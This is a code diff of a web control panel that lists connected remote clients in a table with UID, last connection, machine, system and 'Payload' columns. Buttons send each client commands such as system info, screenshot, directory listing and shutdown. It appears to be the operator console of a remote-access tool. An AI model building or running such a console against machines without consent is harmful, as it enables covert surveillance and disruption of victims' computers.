@@ -12,15 +12,35 @@
     socket.on('client:connect', function(c) {
       const template = `
         <div id="${c}" class="item">
-          <label class="sid">${c}</label>
-          <label class="uid"></label>
-          <label class="cmd"></label>
-          <button onclick="sayhi(${c})">say hi</button>
-          <button onclick="systeminfo(${c})">system info</button>
-          <button onclick="screenshot(${c})">screenshot</button>
-          <button onclick="ls(${c}, 'C://')">ls</button>
-          <button onclick="sendoff(${c})">close</button>
-          <button onclick="shutdown(${c})">shutdown</button>
+          <div style="display: inline-block">
+            <table>
+              <thead>
+                <tr>
+                  <th>UID</th>
+                  <th>Last connection</th>
+                  <th>Machine</th>
+                  <th>System</th>
+                  <th>Payload</th>
+                  <th>Actions</th>
+                </tr>
+              </thead>
+              <tr>
+                <td class="uid"></td>
+                <td class="last"></td>
+                <td class="machine"></td>
+                <td class="system"></td>
+                <td class="payload"></td>
+                <td>
+                  <button onclick="sayhi(${c})">say hi</button>
+                  <button onclick="systeminfo(${c})">system info</button>
+                  <button onclick="screenshot(${c})">screenshot</button>
+                  <button onclick="ls(${c}, 'C://')">ls</button>
+                  <button onclick="sendoff(${c})">close</button>
+                  <button onclick="shutdown(${c})">shutdown</button>
+                </td>
+              </tr>
+            </table>
+          </div>
         </div>
         `;
       $('#list').append($(template));
@@ -33,15 +53,23 @@
 
     socket.on('client:update', function(obj) {
       const $el = $('div#' + obj.sid);
-      $el.find('.uid').html(obj.uid);
-      $('#tree').html(obj.msg);
+      $el.find('div table tr td.uid').html(obj.uid);
+      const fl = new Date(obj.last).toString().match(/(\w+ \d{2} \d{4}).*(\d{2}:\d{2}:\d{2})/);
+      $el.find('div table tr td.last').html(fl[fl.length - 1] + ' ' + fl[fl.length - 2]);
+      console.log(obj);
 
       try {
         const ans = JSON.parse(obj.msg);
         if (ans.ls) {
           fileTree(obj.sid, ans.ls);
+        } else if (ans.systeminfo) {
+          console.log('ans', ans);
+          $el.find('div table tr td.machine').html(ans.systeminfo.name);
+          $el.find('div table tr td.system').html(ans.systeminfo.os);
+          $el.find('div table tr td.payload').html(ans.systeminfo.payload);
         }
       } catch(e) {
+        $('#tree').html(obj.msg);
         console.info('error', e);
       }
     });
@@ -86,8 +114,10 @@
     }
 
     function shutdown(cl) {
-      console.log('shutdown', cl);
-      socket.emit('client:send', {sid: cl, cmd: 'shutdown', args: '0'});
+      if (confirm('shutdown?')) {
+        console.log('shutdown', cl);
+        socket.emit('client:send', {sid: cl, cmd: 'shutdown', args: '0'});
+      }
     }
 
 
